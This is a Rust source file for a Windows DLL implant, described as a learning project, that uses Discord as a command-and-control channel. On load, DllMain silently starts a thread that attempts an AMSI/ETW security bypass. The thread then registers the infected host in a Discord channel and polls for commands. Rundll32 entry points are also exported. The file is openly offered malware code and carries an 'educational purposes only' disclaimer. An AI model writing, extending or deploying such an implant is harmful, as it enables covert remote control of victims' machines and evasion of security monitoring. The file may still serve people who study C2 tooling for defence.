//! Beacon - Discord C2 Client DLL
//!
//! This is a learning project to understand:
//! - Rust DLL development for Windows
//! - Discord REST API communication  
//! - C2 (Command & Control) architecture patterns
//! - Reflective PE loading for dynamic module loading
//!
//! FOR EDUCATIONAL/RESEARCH PURPOSES ONLY

#![allow(dead_code)]

mod commands;
mod config;
mod discord;
mod error;

#[cfg(windows)]
mod bypass;

use std::sync::atomic::AtomicBool;
use std::sync::Arc;

use config::Config;
use discord::DiscordClient;
use error::{BeaconError, Result};

// ============================================================================
// MAIN BEACON LOGIC
// ============================================================================

/// Main beacon execution flow
/// Called from DllMain in a separate thread
pub fn run_beacon() -> Result<()> {
    // Avoid println! in DLL - use OutputDebugString or similar in production
    // For now we keep them for debugging
    
    #[cfg(windows)]
    {
        // Attempt security bypass (AMSI/ETW)
        match bypass::setup_bypass() {
            Ok(_) => {} // Success - silently continue
            Err(_e) => {} // Warning - continue anyway
        }
    }

    // Load embedded configuration
    let config = Config::load()?;

    // Get machine hostname
    let hostname = hostname::get()
        .map_err(|e| BeaconError::Hostname(e.to_string()))?
        .to_string_lossy()
        .to_string();

    // Initialize Discord client from config
    let mut client = DiscordClient::from_config(&config)?;

    // Step 1: Validate token
    client.validate_token()?;

    // Step 2: Get or create channel with hostname
    let (channel, is_new) = client.get_or_create_channel(&hostname)?;

    // Step 3: Notify in general channel
    client.notify_connection(&hostname, &channel.id, is_new)?;

    // Step 4: Start polling loop
    let running = Arc::new(AtomicBool::new(true));
    client.polling_loop(&channel.id, running)?;

    Ok(())
}

// ============================================================================
// DLL EXPORTS - Entry points
// ============================================================================

/// DllMain - Called when the DLL is loaded/unloaded
/// AUTO-STARTS the beacon in a new thread on DLL_PROCESS_ATTACH
#[cfg(windows)]
#[no_mangle]
pub extern "system" fn DllMain(
    _dll_module: *mut std::ffi::c_void,
    call_reason: u32,
    _reserved: *mut std::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if call_reason == DLL_PROCESS_ATTACH {
        // Spawn beacon thread to avoid blocking DllMain
        std::thread::spawn(|| {
            // Small delay to let the loader finish
            std::thread::sleep(std::time::Duration::from_millis(100));
            
            let _ = run_beacon();
        });
    }

    1 // TRUE - success
}

/// Alternative entry point for rundll32
/// Usage: rundll32.exe beacon.dll,Start
#[no_mangle]
pub extern "system" fn Start() {
    let _ = run_beacon();
}

/// Alternative entry point with standard Windows calling convention
/// Usage: rundll32.exe beacon.dll,Run  
#[no_mangle]
#[cfg(windows)]
pub extern "system" fn Run(
    _hwnd: *mut std::ffi::c_void,
    _hinst: *mut std::ffi::c_void,
    _lpsz_cmd_line: *const i8,
    _n_cmd_show: i32,
) {
    Start();
}

/// Stub for non-Windows compilation
#[no_mangle]
#[cfg(not(windows))]
pub extern "C" fn Run() {
    Start();
}
